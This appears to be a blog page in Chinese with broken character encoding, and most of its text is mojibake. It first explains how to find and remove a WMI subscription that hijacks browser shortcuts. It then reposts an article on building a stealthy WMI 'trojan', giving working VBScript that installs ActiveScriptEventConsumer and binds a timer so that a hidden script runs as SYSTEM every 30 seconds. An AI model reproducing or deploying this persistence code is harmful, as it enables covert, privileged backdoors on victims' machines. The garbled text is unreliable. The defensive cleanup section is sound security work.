I"Â<p>æœ‰(bi)æ—¶(zhe)ä¸æ…ä¸­æ‹›åæµè§ˆå™¨ä¸»é¡µæ‰“å¼€å˜æˆ2345ï¼Œhao123ç­‰åƒåœ¾ï¼Œä½†æ˜¯ä¸»é¡µæœ¬èº«æ²¡æœ‰æ”¹åŠ¨ï¼Œåªæ˜¯æµè§ˆå™¨çš„å¿«æ·æ–¹å¼è¢«åŠ äº†å‚æ•°ï¼Œæ­¤æ—¶å»ä¿®æ”¹å‚æ•°ï¼Œè¿‡ä¸€ä¼šåˆä¼šè‡ªåŠ¨ä¿®æ”¹å›æ¥ã€‚&lt;/p&gt;<p>æŸ¥çœ‹ç³»ç»Ÿï¼Œæ²¡æœ‰å¼‚å¸¸çš„æ³¨å†Œè¡¨ã€å¯åŠ¨é¡¹å’Œè¿›ç¨‹ï¼Œä¹Ÿæ²¡æœ‰å¼‚å¸¸çš„ä»»åŠ¡è®¡åˆ’ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æ€€ç–‘æ˜¯ä¸æ˜¯è¢«WMIè„šæœ¬åŠ«æŒäº†ã€‚
</p><p>
è¢«WMIåŠ«æŒçš„ä¸€ä¸ªæ ‡å¿—å°±æ˜¯ï¼Œå½“WMIè„šæœ¬è¿è¡Œï¼Œä¹Ÿå°±æ˜¯å½“ç¯¡æ”¹å¿«æ·æ–¹å¼è¿™ä¸ªåŠ¨ä½œå‘ç”Ÿæ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªscrcons.exeçš„è¿›ç¨‹å¯åŠ¨ï¼Œå¦‚æœæŸ¥çœ‹åˆ°è¿™ä¸ªè¿›ç¨‹ï¼Œé‚£å°±å…«ä¹ä¸ç¦»åäº†ã€‚
</p><p>
è¦æŸ¥çœ‹WMIäº‹ä»¶ï¼Œå»å¾®è½¯ä¸‹è½½ä¸€ä¸ªWMITool

https://www.microsoft.com/en-us/download/details.aspx?id=24045

ä¸‹è½½ï¼Œå®‰è£…ï¼Œ<span style="color: #ff0000;">ç®¡ç†å‘˜&lt;/span&gt;æ–¹å¼è¿è¡Œã€‚&lt;/p&gt;<p>ç‚¹å‡»å·¦ä¸Šè§’register for eventsï¼Œå¼¹å‡ºConnect to namespaceæ¡†ï¼Œç½‘ä¸Šæœ‰äººè¯´æ˜¯å¡«å…¥root\subscriptionï¼Œæˆ‘åœ¨win10ä¸Šæ˜¯å¡«å…¥é»˜è®¤çš„root\CIMV2ï¼Œæ‰¾åˆ°çš„ã€‚&lt;/p&gt;<p>

ç‚¹å‡»å·¦ä¾§_EventFilter:Name="xxxxx"ï¼Œå†è‡³å³ä¾§å³é”®ç‚¹å‡»ActiveScriptEventConsume r Name="xxxx"ï¼Œé€‰æ‹©view instant propertiesï¼Œæ‰¾åˆ°ScriptTextï¼Œå¦‚æœé‡Œé¢æœ‰ä½ è¢«åŠ«æŒçš„é‚£å‡ ç½‘å€ï¼Œé‚£å°±æ˜¯å®ƒäº†ã€‚&lt;/p&gt;<p>å¯ä»¥çœ‹åˆ°ï¼Œå®ƒåŠ«æŒäº†å‡ ä¹å¸‚é¢ä¸Šæ‰€æœ‰æµè§ˆå™¨çš„å¿«æ·æ–¹å¼ã€‚

WMI event viewerä¸­å³é”®ï¼Œç‚¹å‡»åˆ é™¤ã€‚

ç„¶åå»å„ä¸ªå¿«æ·æ–¹å¼ä¸­ï¼Œæ‰‹åŠ¨æŠŠurlå‚æ•°åˆ é™¤ã€‚

okè§£å†³ã€‚&lt;/p&gt;<p>
<h2>å…³äºWMIåŠ«æŒçš„åŸç†ï¼Œè½¬ä¸€ä¸ªæ–‡ç« ï¼š</h2>
<h3 class="title">åˆ©ç”¨WMIæ‰“é€ å®Œç¾â€œä¸‰æ— â€åé—¨-The Core</h3>
<div class="copyright">

æ ‡é¢˜: åˆ©ç”¨WMIæ‰“é€ å®Œç¾â€œä¸‰æ— â€åé—¨-The Core
ä½œè€…: Demon
é“¾æ¥: <a href="http://demon.tw/copy-paste/vbs-wmi-trojan-3.html">http://demon.tw/copy-paste/vbs-wmi-trojan-3.html</a>
ç‰ˆæƒ: æœ¬åšå®¢çš„æ‰€æœ‰æ–‡ç« ï¼Œéƒ½éµå®ˆâ€œ&lt;a href="http://demon.tw/copyright"&gt;ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 2.5 ä¸­å›½å¤§é™†&lt;/a&gt;â€åè®®æ¡æ¬¾ã€‚

</div>
Welcome!å„ä½ScriptKidï¼Œæ¬¢è¿æ¥åˆ°è„šæœ¬ä¸–ç•Œã€‚

ä»Šå¤©å¿™äº†ä¸€å¤©ï¼Œæ¯”è¾ƒç´¯ã€‚ä¸åºŸè¯é‚£ä¹ˆå¤šäº†ï¼Œåˆ‡å…¥æ­£é¢˜ã€‚

è¿™ä¸ªâ€œä¸‰æ— â€åé—¨çš„æ ¸å¿ƒå°±æ˜¯WMIä¸­çš„æ°¸ä¹…äº‹ä»¶æ¶ˆè´¹è€…ActiveScriptEventConsumerï¼ˆä»¥ä¸‹ç®€ç§°ASECï¼‰ã€‚WMIä¸­æœ‰è®¸å¤šè¿™ç±»çš„äº‹ä»¶æ¶ˆè´¹è€…ï¼Œç®€å•çš„æ¥è¯´ï¼Œå½“ä¸å…¶ç»‘å®šçš„äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œæ¶ˆè´¹è€…å°±ä¼šè¢«è§¦å‘æ‰§è¡Œé¢„å…ˆå®šä¹‰å¥½çš„åŠŸèƒ½ã€‚ä¾‹å¦‚å¯ä»¥ç”¨æ¥æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºçš„CommandLineEventConsumerç­‰ç­‰

ASECæ˜¯WMIä¸­çš„ä¸€ä¸ªæ ‡å‡†æ°¸ä¹…äº‹ä»¶æ¶ˆè´¹è€…ã€‚å®ƒçš„ä½œç”¨æ˜¯å½“ä¸å…¶ç»‘å®šçš„ä¸€ä¸ªäº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå¯ä»¥æ‰§è¡Œä¸€æ®µé¢„å…ˆè®¾å®šå¥½çš„JS/VBSè„šæœ¬ã€‚

å…ˆæ¥çœ‹ä¸€ä¸‹å…¶åŸå‹ï¼š
<pre class="lang:vb decode:true">class ActiveScriptEventConsumer : __EventConsumer
{
uint8 CreatorSID = {1,1,0,0,0,0,0,5,18,0,0,0}; //äº‹ä»¶æ¶ˆè´¹è€…çš„CreatorSID åªè¯»
uint32 KillTimeout = 0; //è„šæœ¬å…è®¸è¢«æ‰§è¡Œçš„æ—¶é—´ é»˜è®¤ä¸º0ï¼Œè„šæœ¬ä¸ä¼šè¢«ç»ˆæ­¢
string MachineName;

uint32 MaximumQueueSize;

string Name; //è‡ªå®šä¹‰çš„äº‹ä»¶æ¶ˆè´¹è€…çš„åå­—ã€‚
string ScriptingEngine; //ç”¨äºè§£é‡Šè„šæœ¬çš„è„šæœ¬å¼•æ“ã€‚VBScriptæˆ–è€…JScript
string ScriptFileName; //å¦‚æœä½ æƒ³ä»ä¸€ä¸ªæ–‡ä»¶é‡Œé¢è¯»å–æƒ³æ‰§è¡Œçš„è„šæœ¬çš„è¯ï¼Œå†™ä¸Šè¿™é‡Œå§ã€‚
string ScriptText; //ç”¨äºæ‰§è¡Œçš„è„šæœ¬ä»£ç ã€‚ä¸ScriptFileNameä¸å…±æˆ´å¤©ã€‚æœ‰ä½ æ²¡æˆ‘ï¼Œæœ‰æˆ‘æ²¡ä½ 
};</pre>
ASECçš„å®‰è£…

å¯¹äºXPä»¥åçš„ç³»ç»Ÿæ¥è¯´ï¼ŒASECå·²ç»é»˜è®¤å®‰è£…åˆ°äº†root\subscriptionåç§°ç©ºé—´ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ã€‚2000è‡ªå¸¦æœ‰ASECçš„mofæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰é»˜è®¤å®‰è£…ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å®‰è£…ã€‚å¦å¤–ç”±äºå¤§éƒ¨åˆ†çš„äº‹ä»¶éƒ½æ˜¯åœ¨root\cimv2é‡Œäº§ç”Ÿï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³ç›´æ¥æ•è·ä¸€äº›ç³»ç»Ÿäº‹ä»¶ä½œä¸ºè§¦å‘å™¨çš„è¯ï¼Œè¿˜å¾—åœ¨å…¶ä»–çš„åç§°ç©ºé—´ä¸­å®‰è£…ASECã€‚æ¥çœ‹ä¸€ä¸‹åœ¨2000/XP/Vistaä¸‹å®‰è£…ASECåˆ°root\cimv2çš„ä»£ç ã€‚
<pre class="lang:vb decode:true">Function InstallASECForWin2K    'å®‰è£…ASEC For Windows 2000'
Dim ASECPath2K
ASECPath2K = XShell.Expandenvironmentstrings("%windir%\system32\wbem\")
Set MofFile = FSO.opentextfile(ASECPath2K&amp;"scrcons.mof",1,False)
MofContent = MofFile.Readall
MofFile.Close
MofContent = Replace(MofContent,"\\Default","\\cimv2",1,1) â€˜æ›¿æ¢é»˜è®¤çš„åç§°ç©ºé—´
TempMofFile=ASECPath2K&amp;"Temp.mof"
Set TempMof=FSO.CreateTextFile(TempMofFile,False,True)
TempMof.Write MofContent
TempMof.close
XShell.run "mofcomp.exe -N:root\cimv2 "&amp;TempMofFile,0,TRUE
FSO.DeleteFile(TempMofFile)
ASECStatus = "Ready"
'Wscript.Echo "ASECForWin2K Install OK!"
End Function


Function InstallASECForWinXP    'å®‰è£…ASEC For Windows XP'
Dim ASECPathXP
XPASECPath = XShell.Expandenvironmentstrings("%windir%\system32\wbem\")
XShell.run "mofcomp.exe -N:root\cimv2 "&amp;XPASECPath&amp;"scrcons.mof",0,TRUE 'ç›´æ¥è¿è¡Œå®‰è£…å³å¯
ASECStatus = "Ready"
'Wscript.Echo "ASECForWinXP Install OK!"
End Function

Function InstallASECForVista    'å®‰è£…ASEC For Windows Vista'
Dim ASECPath2K
ASECPath2K = XShell.Expandenvironmentstrings("%windir%\system32\wbem\")
Set f = FSO.GetFile(ASECPath2K&amp;"scrcons.mof")
Set MofFile = f.OpenAsTextStream(1,-2)
'Set MofFile = FSO.opentextfile(ASECPath2K&amp;"scrcons.mof",1,False)
MofContent = MofFile.Readall
MofFile.Close
MofContent = Replace(MofContent,"#pragma autorecover","",1,1) //éœ€è¦åˆ é™¤autorecoverï¼Œå¦åˆ™å®‰è£…å‡ºé”™
TempMofFile=ASECPath2K&amp;"Temp.mof"
Set TempMof=FSO.CreateTextFile(TempMofFile,False,True)
TempMof.Write MofContent
TempMof.close
XShell.run "mofcomp.exe -N:root\cimv2 "&amp;TempMofFile,0,TRUE
FSO.DeleteFile(TempMofFile)
ASECStatus = "Ready"
'Wscript.Echo "ASECForWinVista Install OK!"
End Function
</pre>
å†æ¥çœ‹ä¸€ä¸ªç»‘å®šäº‹ä»¶å’ŒASECçš„å®ä¾‹ã€‚
<pre class="lang:vb decode:true">Function InstallUpdateableTrojan
WMILink="winmgmts:\\.\root\cimv2:" 'ASECæ‰€åœ¨çš„åç§°ç©ºé—´
TrojanName="ScriptKids" 'è‡ªå®šä¹‰çš„æ¶ˆè´¹è€…åå­—ï¼Œä¹Ÿå°±æ˜¯ä½ çš„åé—¨çš„åå­—
TrojanRunTimer=30000 'è‡ªå®šä¹‰çš„è„šæœ¬è¿è¡Œé—´éš”

strtxt="" 'è‡ªå®šä¹‰çš„è„šæœ¬å†…å®¹ã€‚ä¸ºäº†éšè”½æˆ‘ä»¬å°±ä¸ç”¨scriptfilenameäº†ã€‚ä¼šè¢«Windowsç¼–ç åå†™å…¥CIMå­˜å‚¨åº“

'é…ç½®äº‹ä»¶æ¶ˆè´¹è€…&apos;
set Asec=getobject(WMILink&amp;"ActiveScriptEventConsumer").spawninstance_
Asec.name=TrojanName&amp;"_consumer"
Asec.scriptingengine="vbscript"
Asec.scripttext=strtxt
set Asecpath=Asec.put_

'é…ç½®è®¡æ—¶å™¨&apos;
set WMITimer=getobject(WMILink&amp;"__IntervalTimerInstruction").spawninstance_
WMITimer.timerid=TrojanName&amp;"_WMITimer"
WMITimer.intervalbetweenevents=TrojanRunTimer
WMITimer.skipifpassed=false
WMITimer.put_

'é…ç½®äº‹ä»¶è¿‡æ»¤å™¨&apos;
set EventFilter=getobject(WMILink&amp;"__EventFilter").spawninstance_
EventFilter.name=TrojanName&amp;"_filter"
EventFilter.query="select * from __timerevent where timerid="""&amp;TrojanName&amp;"_WMITimer"""
EventFilter.querylanguage="wql"
set FilterPath=EventFilter.put_

'ç»‘å®šæ¶ˆè´¹è€…å’Œè¿‡æ»¤å™¨&apos;
set Binds=getobject(WMILink&amp;"__FilterToConsumerBinding").spawninstance_
Binds.consumer=Asecpath.path
Binds.filter=FilterPath.path
Binds.put_

End Function
</pre>
ä»¥ä¸Šä»£ç çš„å«ä¹‰å°±æ˜¯å½“æˆ‘ä»¬è‡ªå®šä¹‰çš„ä¸€ä¸ªè®¡æ—¶å™¨äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œä¼šè¢«æˆ‘ä»¬æ‰€é…ç½®çš„äº‹ä»¶è¿‡æ»¤å™¨æ•è·åˆ°ï¼Œå¹¶è§¦å‘ä¸è¿‡æ»¤å™¨ç»‘å®šçš„æ¶ˆè´¹è€…ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰äº†è„šæœ¬çš„ASECã€‚è¾¾åˆ°æˆ‘ä»¬æ¯éš”30ç§’æ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬è‡ªå®šä¹‰çš„è„šæœ¬çš„ç›®çš„ã€‚å¾ˆç®€å•å§ï¼šï¼‰

æœ€åè¦è¯´çš„æ˜¯ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„è„šæœ¬è¿è¡Œæ—¶ï¼Œæ˜¯ç”±ç³»ç»Ÿè‡ªå¸¦çš„scrcons.exeä½œä¸ºè„šæœ¬å®¿ä¸»è¿›è¡Œè§£æï¼Œè€Œscrcons.exeæ˜¯ç”±ç³»ç»Ÿä»¥SYSTEMæƒé™å¯åŠ¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„è„šæœ¬æ˜¯ä»¥SYSTEMæƒé™æ‰§è¡Œï¼Œå¹¶ä¸”å…¶æ‰€åˆ›å»ºçš„ä»»æ„è¿›ç¨‹éƒ½ä¼šç»§æ‰¿SYSTEMæƒé™ã€‚ç¾ä¸­ä¸è¶³çš„å°±æ˜¯ï¼Œæ¯å½“è„šæœ¬æ‰§è¡Œæ—¶ï¼Œä¼šå¹³ç™½å¤šå‡ºä¸€ä¸ªscrcons.exeçš„ç³»ç»Ÿè¿›ç¨‹ã€‚è¿™ä¹Ÿæ˜¯è¿™ä¸ªè„šæœ¬åé—¨ç›®å‰æœ€å®¹æ˜“è¢«å‘ç°çš„ä¸€ä¸ªå¼±ç‚¹ã€‚ä¸è¿‡ï¼Œå½“è¿™ä¸ªè„šæœ¬24å°æ—¶æ‰è¿è¡Œä¸€æ¬¡æ—¶ï¼Œæœ‰å¤šå°‘äººä¼šæ³¨æ„åˆ°å‘¢ï¼Ÿ&lt;/p&gt;
</p></p></p></p></span></p></p>
:ET